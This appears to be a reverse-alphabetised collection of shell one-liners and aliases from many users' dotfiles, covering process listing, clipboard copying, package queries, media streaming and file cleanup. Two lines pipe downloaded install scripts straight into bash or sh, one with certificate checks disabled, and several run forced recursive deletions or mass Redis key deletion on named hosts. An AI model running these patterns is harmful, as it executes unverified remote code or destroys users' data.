rtmpdump -v -r rtmp://stream2.france24.yacast.net/france24_live/en -a france24_live/en -W http://www.france24.com/en/sites/all/modules/maison/aef_player/flash/player.swf -p http://www.france24.com/en/aef_player_popup/france24_player -y f24_liveen | mplayer-uau -vo xv -
rtmpdump -v -r rtmp://stream2.france24.yacast.net/france24_live/en -a france24_live/en -W http://www.france24.com/en/sites/all/modules/maison/aef_player/flash/player.swf -p http://www.france24.com/en/aef_player_popup/france24_player -y f24_liveen | mplayer -framedrop -cache $RTMP_CACHE -
rtmpdump -v -r rtmp://fms5.visionip.tv/live -a live -W http://rt.com/s/swf/player5.4.viral.swf -p http://rt.com/on-air/ -y RT_3 | mplayer-uau -vo xv -
rtmpdump -v -r rtmp://fms5.visionip.tv/live -a live -W http://rt.com/s/swf/player5.4.viral.swf -p http://rt.com/on-air/ -y RT_3 | mplayer -framedrop -cache $RTMP_CACHE -
rtmpdump -v -r rtmp://cp103653.live.edgefcs.net/live/international_medium@36382 | mplayer-uau -vo xv -
rtl_fm -f 91.5e6 -M wbfm -s 240k -r 44.1k - | aplay -r 44100 -f S16_LE -t raw
rtl_fm -f 460.150e6 -M fm -s 240k -r 44.1k - | aplay -r 44100 -f S16_LE -t raw
rtcontrol -q -o alias -s alias \\* | uniq -c
rtc | grep 'spec.rb'
rsync -vptl $etcfiles $HOME/.??* $idiskbackupdir/Dotfiles | grep -v 'skipping directory'; rsync -av $HOME/bin $idiskbackupdir
rsync -r *.png max@local.apartment.maxmoulds.net:img/$(date --rfc-3339=ns | cut -d' ' -f1)/
rsync -n -r -i --size-only -C --exclude=.thumbs --delete . /media/disk/pix/ \| less
rstrip-newline | pbcopy
rspec `git ls-files -mo | grep -C0 -E -e
rspec \`git diff-index HEAD --name-only | grep _spec.rb\`
rrr -T | g
rroutes | mate
rpm2cpio *srpm | cpio -idmv --no-absolute-filenames
rpm.qa | grep --color=auto -i
rpm -qa|grep -i
rpm -qa|grep
rpm -qa| grep -i
rpm -qa| grep
rpm -qa | wc -l
rpm -qa | sort
rpm -qa | sed 's/\-[0-9].*//' > /home/rod/backup/installed_yum_packages.txt
rpm -qa | less
rpm -qa | grep -irn
rpm -qa | grep -i
rpm -qa | grep
rpm -qa --queryformat '%10{size} - %-25{name} \t %{version}\n' | sort -n
rpm -qa --queryformat '%010{SIZE}\t%{NAME}\t%{VERSION}-%{RELEASE}\n' | column -t
rpm -qa --last | less -XFR
rpm -q -a | grep -i
rpm -q -a | grep
rpm -q --all | grep -i
rpm -aq | grep
routes | grep
route get default | grep interface
route get 0.0.0.0 2>/dev/null | awk '/interface: / {print $2}';
route -n | xg -P
route -n get default | grep gateway:
rostopic list | grep
rosservice list | grep
rosparam list | grep
rosnode list | grep
root && git diff | vim -
robocfg show | grep Port
rmrepl | rmshell
rmdir $(ls -F | grep /)
rm.core; make clean; find . -name '*~' -or -name '*.o' -or -name '*.so' -or -name '*.a' -not -name '*util.so' | xargs rm
rm ~/mynotify.log; check-system.sh 2>&1 | tee ~/check.log; less ~/mynotify.log ~/check.log
rm ~/mobile_reviews/test_2; rm ~/pg/flow_analysis/flow_analysis/data/mobile_reviews_flow_test.json; python batch/adhoc/mobile/mobile_session_analysis/mr_mobile_session_generic_data_with_dimensions.py ~/mobile_reviews/s1 > ~/mobile_reviews/test_2; cat ~/mobile_reviews/test_2 | python batch/adhoc/mobile/mobile_session_analysis/mobile_session_pprint.py --use-stdin > ~/pg/flow_analysis/flow_analysis/data/mobile_reviews_flow_test.json
rm ~/logs/test_step2_1; rm ~/pg/flow_analysis/flow_analysis/data/sign_up_flow_test2.json; python batch/adhoc/mobile/mobile_session_analysis/mr_mobile_session_generic_data_with_dimensions.py ~/logs/small_1000000_2_analysis_base > ~/logs/test_step2_1; cat ~/logs/test_step2_1 | python batch/adhoc/mobile/mobile_session_analysis/mobile_session_pprint.py --use-stdin > ~/pg/flow_analysis/flow_analysis/data/sign_up_flow_test2.json
rm ~/Library/Application\ Support/Skype/Skype.pid | open -n /Applications/Skype.app
rm ~/.config/pianobar/out; pianobar | tee ~/.config/pianobar/out
rm tags && bundle list --paths=true | xargs ctags --fields=+l --extra=+f --exclude=.git --exclude=log -R err.txt generated.file succ.txt
rm `ls | grep -v \.cpp$`
rm `ls | grep -v $1`
rm -vrf $(ls | fzf-tmux -r 30% --multi --reverse)
rm -vf `find ~/.emacs.d/ | grep \.elc`
rm -rfv ~/.Trash/ | tee ~/.trash.log
rm -rf ~/.mac_setup && curl https://raw.githubusercontent.com/shunkakinoki/mac_setup/master/install.sh | bash
rm -rf ~/.local/share/Trash/files && figlet -t Trash Emptied | lolcat
rm -rf node_modules/ ; npm install ; ls -al node_modules/ | wc -l ; du -h -d 0 node_modules/
rm -rf build && find . -name 'Mock*' | xargs rm -rf && git checkout test/Driver/Cme/MockCmeOrderSession.hpp test/Driver/Cme/MockCmeOrderSession.cpp && ./make.sh
rm -rf `reals ${tomcatLogDir}/localhost_log.*.txt | tail --lines=1`
rm -rf .pub .packages && find . -name packages | xargs rm -rf
rm -rf ${HOME}/backup/zsh/backup/`ls -rt ${HOME}/backup/zsh/backup | head -n 1`; tar cfz ${HOME}/backup/zsh/backup/`date
rm -rf ${HOME}/backup/emacs/elpa/`ls -rt ${HOME}/backup/emacs/elpa | head -n 1`; tar cfz ${HOME}/backup/emacs/elpa/`date
rm -rf $HOME/.oh-my-zsh && wget --no-check-certificate http://install.ohmyz.sh -O - | sh
rm -rf $(locate Weborama/ORM/Advertiser | grep perlbrew)
rm -r **/*.(pyc|pyo) **/__pycache__
rm -i `find . | grep .swp$`
rm -i `find . | grep .swo$`
rm -i `find . | grep .swn$`
rm -i (.*~|*~)
rm -i (*\~|\#*\#)(DN)
rm -fv ~/.vimswap/* ; find . -type f -name *.swp | xargs rm -fv
rm -f vim.itm.dis;ln -nsf merlin_htt.log vim.itm.log;find *.dis|xargs -I {} sh -c 'cat {} >> vim.itm.dis';gvim +\
rm -f *~ | rm -f \#*\#
rm -f (.*~|*~)
rm -f $(find . | grep \.#)
rm -f $(/bin/ls *% .*% .*~ *~ \#*\# [c][o][r][e] [L][O][G] 2>/dev/null | tee /dev/tty) >/dev/null
rm *(*~|a.out)
rm $(swap_files|xargs)
rm $(find . | grep ~$)
rls |v-
rll -S |v-
rl -c 4 /usr/share/dict/words | xargs echo
rk routes | grep --color
rip(){ mv $1 `echo $1 | sed
rg | fzf
rg ^bindsym ~/.config/i3/config | fzf
rg . | fzf
rg . -l | fzf
rg . -S | fzy
rg -l 'binding.pry' | xargs sed --in-place '/binding.pry/d'
rg -i @todo | tee >(wc -l)
rg -L -uuu --files . 2>/dev/null | rg -S
rg --type ts --files | fzf
rg --no-line-number ' *(\[.\].*\*)$' $NOTES_BASE_PATH/notes/todo.txt --replace '\$1' | sort
rg --no-heading . | fzf --delimiter=: --nth=2..
rg --files ~ | fzf
rg --files | rg -S $1
rg --files | rg
rg --files | grep
rg --files | fzf
rg --files | ctags -R -L - --exclude=@ctags_exclude_list
rg --files | ctags -R --links=no -L -
rg --files | ctags -L-
rg --files . | grep -i
rg --files -u| rg
rg --files --sort-files | rg
rg '' | fzf -e
reveal amber; find . -name '*_shpec.*sh' -print0 | xargs -t0I % bash -c 'echo \$BASH_VERSION; shpec %'
resolve # default | <changelist>
reset | git diff
reset && tail -c+1 --follow=name --retry /local/scratch/esnap_jla/pcie_vip_trans.log | grep -i msg -A 60
reset && tail -c+1 --follow=name --retry /local/scratch/esnap_jla/pcie_transactions.log | grep -i msg -A 60
reset && tail -c+1 --follow=name --retry /local/scratch/esnap_jla/hwlog | grep UART
rerun -- rackup config.ru -o `ifconfig | grep
repos-installed | xargs -I{} echo /mnt/{}
repos | xargs -L 1 gsync st
repos | xargs -L 1 gsync import
repos | xargs -L 1 gsync export
repocmd git status | cleanStatus
repo-elephant | lolcat
repo forall -c 'if git status --porcelain=v2 | grep \
repo forall -c 'if git status --porcelain=v2 --ignored | grep \
repo forall -c 'if git status --porcelain=v1 -b | grep \
rename -v 's/[\/\\?%*:|\
rename 's/\./ /g' err.txt generated.file succ.txt ; rename 's/ tar gz/.tar.gz/' *gz ; rename 's/ (.{3}|.{2})$/.\$1/' *; rename 's/(%20)+/ /g' err.txt generated.file succ.txt ; rename 's/é(%CC%81)+/ée/g' err.txt generated.file succ.txt ; rename 's/_+/ /g' err.txt generated.file succ.txt ; rename 's/^ //' err.txt generated.file succ.txt
remove-last-newline | xclip -selection clipboard
remind -n ~/.reminders | sed 's#^[0-9][0-9][0-9][0-9]/[0-9][0-9]/[0-9][0-9] ##'
remind -n ~/.reminders | less
remind -n | sort; cat ~/.todo
remind -g -q ~/.reminders | grep -ve '-[0-9][0-9]*h[0-9][0-9]*m$'
rem -aq | awk 'NF'
relevant-tests | specr
redo dialyzer 2>&1 | less
redis-cli monitor | grep -E ' \
redis-cli get weather_observation_data | jq
redis-cli get weather_data | jq
redis-cli -n 1 monitor | cut -b -200
redis-cli -h redis.staging.bbrands.com.br KEYS $1 | xargs redis-cli -h redis.staging.bbrands.com.br DEL
redis-cli -h redis.service.consul KEYS $1 | xargs redis-cli -h redis.service.consul DEL
recordmydesktop --windowid \$(xwininfo | awk '/Window id:/ {print \$4}')
rec -c 2 -r 44100 -s -t wav - | oggenc -q 5 --raw --raw-chan=2 --raw-rate=44100 --raw-bits=16 -o out.ogg -
read message; cowsay $message | lolcat
read a; echo $a | echo $((16#$_))
read a; dd bs=1 count=1024 if=$a 2>/dev/null | strings
read a; curl -sr 0-1024 $a | strings
read $PROCESS_NAME;sudo pidof $PROCESS_NAME | xargs sudo kill -9
react-native run-ios | xcpretty
react-native log-ios | ccze -A -o nolookups
react-native log-android | ccze -A -o nolookups
rdio link | pbcopy
rdesktop -g $(xrandr -q | awk
rdesktop -a 16 -z -P -g 1440x900 -u o.tharan -d PAR -x 0x20 -r clipboard:PRIMARYCLIPBOARD -p $(pass xxx | head -1)
rc rake routes | eval $EDITOR -
rc -c 'ruby $* |[2] cat'
rankmirrors -n 6 /etc/pacman.d/mirrorlist.backup | sudo tee /etc/pacman.d/mirrorlist
ranger | lolcat
rake spec | grep \
rake routes|less
rake routes| less
rake routes |grep
rake routes | vim -
rake routes | sed -e \
rake routes | sed -e
rake routes | mate
rake routes | lolcat
rake routes | less -S
rake routes | less
rake routes | grep -i
rake routes | grep $@
rake routes | grep $1
rake routes | grep
rake routes | ag
rake routes | ack $1
rake routes | ack
rake routes | $FZF_COMMAND
rake email_eyeball:all\[mark.gandolfo@hooroo.com\] source=qantas | lolcat
rake email_eyeball:all\[mark.gandolfo@hooroo.com\] source=jetstar | lolcat
rake db:drop db:create db:migrate db:test:prepare db:fixtures:load |grep '^==.*migrated'
rake app:routes | grep
rake TIMER=true 2>/dev/null | grep \
rake -T | grep -in
rake -T | grep $1
rake -T | grep
rake -T | g? \$1
rake -T | g? $1
rake -T | g
rails s 2>&1 | grep -v content-length
rails routes | grep -v rails
rails routes | grep
rails routes | ag
rails db:migrate:status | tail -n 15
railroady -M | dot -Tsvg > doc/models.svg
railroady -M | dot -Tpng > models.png
railroady --alphabetize --transitive --all-columns -M | dot -Tsvg > models.svg; open models.svg
railgun status -a -H -o name | xargs -n1 railgun stop
rabbitmqadmin -f tsv -q list queues name | while read queue; do rabbitmqadmin -q delete queue name=${queue}; done;
ra | grep
r keys \* | sed -e
quoteLine.pl | xargs cygpath.exe
quote | sed 's/.*“\(.*\)”.*/\1/g'
quote | cowthink -W 100 -s
quota -s 2>/dev/null|awk 'NR>3 {print \
quilt series -v | less -R
qstat|less
qstat | sort -n
qstat | sed 's/^/ /'
qstat | less
qstat | grep veryshort && echo
qstat | grep swa
qstat | grep sml6467
qstat | grep sagar.*r
qstat | grep lidj
qstat | grep junoq
qstat | grep jmerkin
qstat | grep heitz
qstat | grep dybshortq
qstat | grep dyb64q
qstat | grep dantopa
qstat | grep $me
qstat | grep $USER
qstat | grep
qstat | awk
qstat -u jiguanyu|less -S
qstat -u ashiklom | less
qstat -u '*' |less
qstat -u '*' | less
qstat -u $USER -f | grep -E $QINFO
qstat -f | head -n290
qstat -f | grep ms.q
qstat -f | grep au
qstat -f | grep -E $QINFO
qstat -f | awk '\$6 ~ /[a-zA-Z]/ {print \$0}'
qstat -f | awk '\$6 ~ /[a-zA-Z]/ && \$1 ~ /default.q@/ {print \$0}'
qstat -f -u '*' | less
qstat -cl_dep Management | grep Orca
qstat -c | grep -A 2 frank
qstat -a | grep $USER
qsize -f -m | sort -nk6
qsize -a -k | sort -n -k 6
qlop -s | tail -n1
qlist | pbcopy
qlist -IC|xargs quickpkg --include-config=y
qgit --all &>/dev/null &|
q -xml | grep -e 'JB_name'
p|g
p|fgrep $1
p|egrep
python3.7 -m pip freeze --local | grep -v
python3 ~/scripts/ssngenerator.py | pbcopy
python3 tap-deputy.py -s state.json -c config.json | target-stitch -c config.json
python3 /usr/local/bin/quote_of_the_day.py | lolcat
python3 /opt/PY3/CONJUGAR/RESOURCES/search.py $1 | egrep $1
python3 -m json.tool | pygmentize -f terminal256 -l json -O style=monokai
python3 -m http.server 8000 | open http://localhost:8000
python3 -m http.server --bind \`ip address |grep \
python2 ~/diceware/diceware -w 9 -s | xsel -i -b
python2 ~/diceware/diceware -w 8 -s | xsel -i -b
python2 ~/diceware/diceware -w 7 -s | xsel -i -b
python2 ~/diceware/diceware -w 6 -s | xsel -i -b
python2 ~/diceware/diceware -w 5 -s | xsel -i -b
python2 ~/diceware/diceware -w 4 -s | xsel -i -b
python2 ~/diceware/diceware -w 3 -s | xsel -i -b
python2 ~/diceware/diceware -w 2 -s | xsel -i -b
python2 ~/diceware/diceware -w 1 -s | xsel -i -b
python2 2>&1 | logger -t bootstrap
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 9 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 8 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 7 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 6 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 5 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 4 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 3 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 2 | xsel -i -b
python2 /mnt/R2D2/Dropbox/git/diceware/diceware-v2 -w 1 | xsel -i -b
python ~/code/python/gprof2dot.py -f pstats profile.stats | dot -Tpng -o output.png && gnome-open output.png
python ~/apps/t/t.py --task-dir ~/dotfiles/tasks --list tasks | sort -k3
python ~/Tools/pp_xml.py | pygmentize -l xml
python ~/Documents/Script/help/bin/help password | grep
python tail_alerts.py -f | grep dumptruck
python setup.py bdist_wheel && twine upload dist/$(ls -t dist/ | head -1)
python setup.py --long-description | rst2html > foo.html; x-www-browser foo.html
python manage.py test --test-seed=-1 2>&1 |tee ~/workspaces/wf/test-logs/BigSkyTests_`date +%y.%m.%d_%I:%M%p`.log
python manage.py showmigrations | sed -n
python manage.py show_urls | grep
python ca.py -f new.html && cat default.html | xclip && echo 'Copied to Clipboard'
python /usr/bin/ufs_trace_tool.py -c | tail -n
python /opt/apertium/n/dev/tagger-to-visl.py |vislcg3 -tg /opt/apertium/n/apertium-nn-nb.nn-nb.rlx
python /opt/apertium/n/dev/tagger-to-visl.py |vislcg3 -tg /opt/apertium/n/apertium-nn-nb.nb-nn.rlx
python /home/adam/Downloads/shadowsocksr/shadowsocks/local.py -c /etc/shadowsocks_vultr.2.json -t 120 &|
python /Users/malcomgilbert/Dropbox/Classes/21m.269/pdfJoin.py -o combined.pdf `ls|grep .pdf$`
python -mjson.tool|pygmentize -l javascript
python -mjson.tool|grcat ~/.grc/conf.curl
python -mjson.tool | pygmentize -ljson
python -mjson.tool | pygmentize -l json;
python -mjson.tool | pygmentize -l json
python -mjson.tool | pygmentize -l js
python -mjson.tool | pygmentize -l javascript
python -mjson.tool | pygmentize -g
python -mjson.tool | pygmentize -f terminal256 -l json -O bg=dark
python -mjson.tool | pygmentize -f terminal256 -l javascript -O style=native
python -mjson.tool | lolcat
python -mjson.tool | less
python -m pip freeze | grep
python -m json.tool |pygmentize -l json
python -m json.tool |less
python -m json.tool | pygmentize -l json -f terminal256
python -m json.tool | pygmentize -l json
python -m json.tool | pygmentize -l js
python -m json.tool | pygmentize -l javascript
python -m json.tool | pygmentize -g
python -m json.tool | pygmentize -O style=monokai -f console256 -l json
python -m json.tool | pygmentize -O style=monokai -f console256 -g
python -m json.tool | pcat
python -m json.tool | pager
python -m json.tool | less; clear
python -m json.tool | less
python -m json.tool | hl --syntax=json
python -m json.tool | highlight
python -m json.tool | dog -l json
python -m json.tool | ccat
python -m json.tool | bat -l json
python -m json.tool --sort-keys | pyg -l json
python -m `python -V 2>&1|perl -ne 'print/ 2/?
python -m SimpleHTTPServer | ngrok http 8000
python -m SimpleHTTPServer | chrome 'http://localhost:8000'
python -m SimpleHTTPServer 8000 | open 'http://localhost:8000'
python $package_src_root/manage.py runserver | json-log-tail
python $REPO/bin/summary_log.py $HOME/logs/nginx/`ls $HOME/logs/nginx | tail -1`
pylint -rn *.py | grep -v 'Locally disabling'
pylint --list-msgs |grep
pylint *.py | grep 'our code has been rated'
pyjwt decode --no-verify ${TOKEN}|jq
pygmentize /data/0/lib/task/docs/examples.md | less -S
pygmentize -s -l sh -f 258 -O style=solarizeddark | less -RS
pygmentize -l yaml | less
pygmentize -l d | less -r
pygmentize -l bash ~/.bash_aliases | less -R
pygmentize -g $SCRIPT|grep
pygmentize -g $1 | less -N
pyflakes .py | not __init__.py
pyenv versions | grep -v /envs/
pyenv versions | grep -i
pyenv shell 3.4.6;export PATH=$(echo $PATH | sed -e 's/:\/Users\/jimorie\/.pyenv\/versions\/[^:]*//g');export PATH='$PATH:/Users/jimorie/.pyenv/versions/3.4.6/bin'
pyenv shell 2.7.13;export PATH=$(echo $PATH | sed -e 's/:\/Users\/jimorie\/.pyenv\/versions\/[^:]*//g');export PATH='$PATH:/Users/jimorie/.pyenv/versions/2.7.13/bin'
pyenv activate \$(pyenv versions | fzy -l 20)
pyenv activate \$(pev | fzy -l 20)
pydf |grep -v
pydf | rg nvme --color never
pydf | ack -v tmp
pydf -h -H -l | sort -r -n
pycodestyle --statistics -qq . | sort -k 1 -n -r
pycharm-professional | pycharm-community
py.test --capture-sys | less && rm -r __pycache__/
px -ef | less
pwgen-passphrase -s - -l 5 -w eff-short | xsel -b -s
pwgen 32 -1 | xsel -b -s
pwgen 15 1 -s -y | tr -d
pwgen 10 -c -n -B -v -1 | cracklib-check
pwgen -sy 25 1 | xcl
pwgen -sB 20 | xclips
pwgen -s1vv 64 | pbcopy && echo Nytt passord er kopiert til utklippstavlen
pwgen -s1vv 12 | pbcopy && echo Nytt passord er kopiert til utklippstavlen
pwgen -s 20 -c 1 | cb
pwgen -s 15 1 | xsel -b
pwgen -s 10 1 | xclip -f
pwgen -cnsy 16 1|pbcopy
pwgen -1cnsB 12 >&2 | xclip
pwgen -1 16 -B -c | clipcopy && clippaste
pwd|xsel -p;pwd
pwd|xsel
pwd|xclip -selection s
pwd|xclip -selection clipboard
pwd|xclip
pwd|tr -d
pwd|pbcopy;pwd
pwd|pbcopy; pbpaste; echo 'copied to clipboard'
pwd|pbcopy
pwd|open -a Finder
pwd|clip.exe
pwd|c
pwd|awk -F- '{print \$2}'
pwd| pbcopy
pwdgen() { head -c 5000 /dev/urandom | tr -dc
pwdd | onelogin_login
pwd;pwd|pbcopy
pwd; pwd|xclip -selection clipboard
pwd; pwd|pbcopy
pwd; pwd | xclipcp
pwd; pwd | pbcopy
pwd-base | sed 's/-/_/g'
pwd |xsel -b;pwd
pwd |tr
pwd |pbcopy
pwd | xsel -s
pwd | xsel -p -b
pwd | xsel -is
pwd | xsel -ib
pwd | xsel -i
pwd | xsel -bi
pwd | xsel -b
pwd | xsel --secondary
pwd | xsel --clipboard
pwd | xsel
pwd | xi
pwd | xfce4-terminal &
pwd | xclip; echo $PWD
pwd | xclip -selection secondary
pwd | xclip -selection clipboard && echo xclip -selection clipboard
pwd | xclip -selection clipboard
pwd | xclip -selection c
pwd | xclip -sel clipboard
pwd | xclip -sel clip
pwd | xclip -sel c -r
pwd | xclip -r -selection clipboard
pwd | xclip -in -selection primary; echo 'pwd copied in X clipboard'
pwd | xclip -i -selection c
pwd | xclip -i
pwd | xclip && echo 'pwd copied to clipboard'
pwd | xclip
pwd | xargs tree -CFh --dirsfirst
pwd | xargs tmux set default-path
pwd | xargs tmux set -g default-path
pwd | xargs nautilus
pwd | xargs cygpath.exe -w
pwd | xargs -I % echo 'cd \
pwd | x
pwd | urxvtc
pwd | urxvt &
pwd | tr \
pwd | tr -d '\n' >/dev/clipboard
pwd | tr -d
pwd | todo ${CDLDB} a
pwd | tee >(xclip -i)
pwd | tee >(pbcopy)
pwd | tee $HOME/.tsync
pwd | simple_clipboard
pwd | setclip
pwd | sed \
pwd | sed -e s*/*🥖*g
pwd | sed 's/\/home\/aleks/~/'
pwd | sed 's/\/Users\/mateus/~/'
pwd | sed 's/\(\/google\/src\/cloud\/zzb\/.*\/google3\/\)blaze-bin\/\(.*\).*/\1\2/g'
pwd | sed 's/\(\/google\/src\/cloud\/zzb\/.*\/google3\/\)\(.*\).*/\1blaze-genfiles\/\2/g'
pwd | sed 's/\(\/google\/src\/cloud\/zzb\/.*\/google3\/\)\(.*\).*/\1blaze-bin\/\2/g'
pwd | sed 's/\(\/google\/src\/cloud\/zzb\/.*\/google3\/\).*/\1/g'
pwd | sed 's/ /\\\ /g' > ~/.cdo
pwd | sed 's/ /\\ /g'
pwd | sed 's#.*/##'
pwd | sed
pwd | ruby -pe
pwd | perl -pe 's/^.+\/([0-9]+)\s-\s(.+)\s-\s(.+)$/\$3/e'
pwd | perl -pe 's/^.+\/([0-9]+)\s-\s(.+)\s-\s(.+)$/\$2/e'
pwd | perl -pe 's/^.+\/([0-9]+)\s-\s(.+)\s-\s(.+)$/\$1/e'
pwd | pcp
pwd | pbcopy;pwd
pwd | pbcopy; pwd
pwd | pbcopy; pbpaste
pwd | pbcopy-noeol
pwd | pbcopy'
pwd | pbcopy -selection clipboard
pwd | pbcopy && pwd && echo copied to clipboard!
pwd | pbcopy && pwd
pwd | pbcopy && echo copyed current path
pwd | pbcopy && echo 'Path to working directory copied to clipboard.'
pwd | pbcopy
pwd | p
pwd | lolcat
pwd | grep -o '[^/]*$'
pwd | grep --color='auto' -E -o '\/.-test-suite'; git branch && git status
pwd | cx
pwd | cut -d
pwd | cs clipboard; clear
pwd | cpy
pwd | cowsay -W 100
pwd | copy
pwd | cop
pwd | clipcopy
pwd | clipboard
pwd | clip.exe
pwd | clip
pwd | ccp
pwd | ccopy
pwd | cb
pwd | cat > ~/.save_pwd
pwd | cat - > $wd
pwd | c
pwd | bash ~/.rc/cityU/disk2pwd.sh
pwd | awk -F '/' '{ print \$4 }'
pwd | _capture_output
pwd | /Applications/Sourcetree.app/Contents/MacOS/Sourcetree &
pwd | ${CLIPBOARD}
pwd | $MVJ3_CLIPBOARD
pwd > ../.gtg.txt && cd .. && cat .gtg.txt | xargs rm -r && rm .gtg.txt
pwd && pwd | xclip -i
pwd && pwd | pbcopy
pwd && pwd | ${clipboard}
pw | grep
pushd ~/.suckless/st && updpkgsums && yes | makepkg -efi; popd
pushd ~/.suckless/dwm && updpkgsums && yes | makepkg -efi; popd
pushd `pwd` 1>/dev/null; cd /vagrant/expo; py.test --reuse-db --cov-report html --cov=. tests/ |& tee /vagrant/expo/logs/test-errors.log; popd 1>/dev/null
pushd `pwd` 1>/dev/null; cd /vagrant/expo; /vagrant/expo/manage.py runserver 0.0.0.0:8111 |& tee /vagrant/expo/logs/runserver.log; popd 1>/dev/null
pushd ${ourdir} && bundle exec htmlproofer _site --assume-extension --check-favicon --check-html --check-img-http --check-opengraph --report-invalid-tags --report-missing-names --report-script-embeds 2>&1 | less ; popd > /dev/null
pushd $P4ROOT;/usr/local/bin/perforce_status|less;popd
pushd $MAJIO_HOME ; find . -name '.settings' -o -name '.project' -o -name '.classpath' -o -name 'target' | xargs rm -rf ; popd ;
puppet_noop | PUPPET_FILTER
puppet_autoapply | PUPPET_FILTER
puppet_alltags -f | PUPPET_FILTER
puppet agent -t 2>&1 | tee ~/pat.out
puppet agent -t --debug 2>&1 | tee ~/pat.out
pulsemixer --get-volume | cut -d ' ' -f 1
pueue show | tail
pubip | pb
pub | tee >(c)
pub upgrade --packages-dir --verbosity=solver | grep --after-context 2
pt `whoami` | grep java
ps|grep frank
ps|grep
psu|grep --color
psu |more
psu |less
psu | grep
pst|grep
pstree|less
pstree | lv
pstree | less
pstree | grep
pstree G --no-color \.exe | perl -M5.012 -pe
pstree -wg3 | less
pstree -pU | less
pstree -p | grep package-data-do
pstree -p | grep -C 5
pstree -luap | less
pstree -l -p | less
pstree -hanpA | less -RS
pstree -hanUul $USER | less
pstree -au | grep
pstree -apl | less
pstree -ap | less
pstree -al | less
pstree -acGhlunp | more
pstree -aAl | vim -
pstree -Uh|$PAGER
pstree -G |more
pstree -G | less
pstree -Auh | less
pstree -Ap | less
pstree $USER -p | grep -iB2
pstc | grep -v grep
pss | grep `whoami`
psql -c '\list+' | ~/.dotfiles/bin/pgdbs_filter.rb
psp3 | awk '{print \
psmem | tail -5
psmem | tail -10
psmem | head -n 10
psmem | head -10
psme | grep
psj | grep standalone
psg | grep java
psg | grep TestClientLauncher
psg | grep TCServerMain
psg | grep Dcatalina.home=
psf |more
psf |less
psf | g
psef | grep
psd | less
psc|grep
pscpu5 | tail -5
pscpu | tail -5
pscpu | tail -10
pscpu | head -n 10
pscpu | head -10
psaux|more
psaux|grep
psauxg | grep
psaux | g -i -e VSZ -e
psall | less
psall | grep
psa | grep -i
psa | grep
psa | g
ps-ssh; ps-ssh-pids | xargs kill
ps-ssh | cut -b 8-15
ps-e | grep $1 -i
ps | wc
ps | peco
ps | less
ps | grep java
ps | grep chrome
ps | grep -v \
ps | grep -i --color=never -e WINPID -e
ps | grep -i $1
ps | grep -i
ps | grep
ps | fzf --reverse --header-lines=1 --bind 'enter:execute(kill -9 {1})'
ps | fgrep R
ps | ack
ps xw | grep
ps xf | cat
ps xawu | grep -i $USER
ps xawu | grep -i
ps xauwww | grep -i
ps xau | grep
ps xa | grep python
ps xa | grep --color=auto
ps xa | grep
ps x | grep openvpn
ps x | grep -i $1
ps x | grep -i
ps x | grep
ps x | $PAGER
ps wwwwaux | grep
ps wwuax |grep
ps wwaux|grep
ps wwaux | grep
ps waux |grep
ps waux | grep davep
ps waux | grep -i --color=auto
ps waux | grep -i
ps waux | grep
ps ux|grep
ps uxaw | head
ps uxaw -m | head
ps uxaw -c | head
ps uxaw --sort=-pmem | head
ps uxaw --sort=-pcpu | head
ps uxaf | most
ps uxaf | grep'
ps ux | less
ps ux | grep vim
ps ux | grep \
ps ux | grep -i
ps ux | grep -a
ps ux | grep
ps ux | awk 'NR > 1 {res += \$3} END { print \
ps ux | awk '/pitivi/ && !/awk/ {print $2}'
ps ux | ${PAGER}
ps ux --sort=-%cpu | less -S
ps uax|grep -i --color
ps uax | grep
ps uax | $PAGER
ps u | grep
ps h -p $PPID -o cgroup | sed 's/.*\///g'
ps gux | grep firefox
ps gux --sort -etime | grep -i xvnc
ps gauxwwwf | ${PAGER}
ps fuxa |grep $1
ps fux | grep $USER
ps faxvvvv | gr
ps faxu | grep
ps fax |grep
ps fax | grep
ps fawx | less
ps faux|awk '\$8 ~ /D/{print}'
ps faux |less
ps faux | less
ps faux | grep sshd
ps faux | grep ftp
ps faux | grep florent
ps faux | grep -ni
ps faux | grep -i $1
ps faux | grep --color=never sbritt
ps faux | grep
ps ax|less
ps ax|grep -i $@
ps ax|grep -i
ps ax|grep $1
ps ax|grep
ps ax|ack
ps axwww | grep
ps axww | grep
ps axw | grep
ps axuw|grep -i
ps axuf | pager
ps axuf | less -s
ps axuf | grep jmx
ps axuf | grep java
ps axuf | grep activemq
ps axuc --sort -pcpu | less
ps axu | grep -i
ps axu | grep --color=always
ps axu | grep
ps axu --sort=-pmem|less -I
ps axo %cpu | awk '{s+=$1}END{print s}'
ps axjf | sed -e '/^ PPID.*$/d' -e's/.*:...//'
ps axjf | less
ps axjf --cols 10000 | egrep
ps axfu | grep
ps axf | grep
ps axf | fgrep -i
ps axc | grep
ps axMuc | egrep '^[a-zA-Z0-9]'
ps ax |grep
ps ax | xargs grep
ps ax | wc -l
ps ax | sed '1p;/ [U] /!d'
ps ax | rg
ps ax | peco
ps ax | less
ps ax | igrep
ps ax | grep'
ps ax | grep ssh
ps ax | grep rails
ps ax | grep quotad
ps ax | grep node
ps ax | grep nginx
ps ax | grep mysql
ps ax | grep java
ps ax | grep :5858
ps ax | grep -v root
ps ax | grep -v ]$
ps ax | grep -i [g]radledaemon
ps ax | grep -i --color
ps ax | grep -i
ps ax | grep -E
ps ax | grep $1
ps ax | grep $*
ps ax | grep
ps ax | g $1
ps ax | fzf
ps ax | egrep
ps ax | ag -i
ps ax | ag
ps ax | ack
ps ax | a
ps awx | grep nginx
ps awx | grep httpd
ps awx | grep 'jav[a]'
ps awx | grep
ps awwfux | less -S
ps awux | less
ps awfuxxww | grep ^$USER
ps aux|sort -nr +4 -5
ps aux|sort -k3n
ps aux|rg $1
ps aux|pgrep
ps aux|perl -ne '@_=split(/\s+/);print \$_ if \$_[3] > 2;'
ps aux|perl -ne '@_=split(/\s+/);print \$_ if \$_[2] > 2;'
ps aux|less
ps aux|grep ssh
ps aux|grep motion
ps aux|grep `whoami`
ps aux|grep /usr/bin/[X]
